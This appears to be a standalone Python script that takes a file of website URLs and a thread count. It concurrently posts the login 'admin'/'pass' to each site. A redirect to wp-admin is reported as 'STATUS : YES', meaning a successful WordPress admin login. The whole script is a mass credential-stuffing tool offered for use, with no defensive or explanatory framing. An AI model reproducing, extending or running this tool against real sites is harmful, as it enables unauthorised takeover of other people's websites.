import sys
import requests
import concurrent.futures

if len(sys.argv) != 3:
	print(f'python3 {sys.argv[0]} website.txt 15')
	sys.exit(1)

website = open(sys.argv[1], 'r')
threads = int(sys.argv[2])

def load_url(web):
    web = web.strip()

    try:
        x = requests.post(web, data={'log': 'admin', 'pwd': 'pass'})
        return x.url
    except:
        return 'ERROR !'

with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as e:
    futures = {e.submit(load_url, web): web.strip() for web in website}
    for future in concurrent.futures.as_completed(futures):
        url = future.result()
        web2 = futures[future]

        print(f'WEBSITE  : {web2}')
        print(f'REDIRECT : {url}')

        if 'wp-admin' in url:
            print('STATUS   : YES')
        elif 'wp-login.php' in url:
            print('STATUS   : NO')
        else:
            print('STATUS   : I Don\'t Know')

        print('')
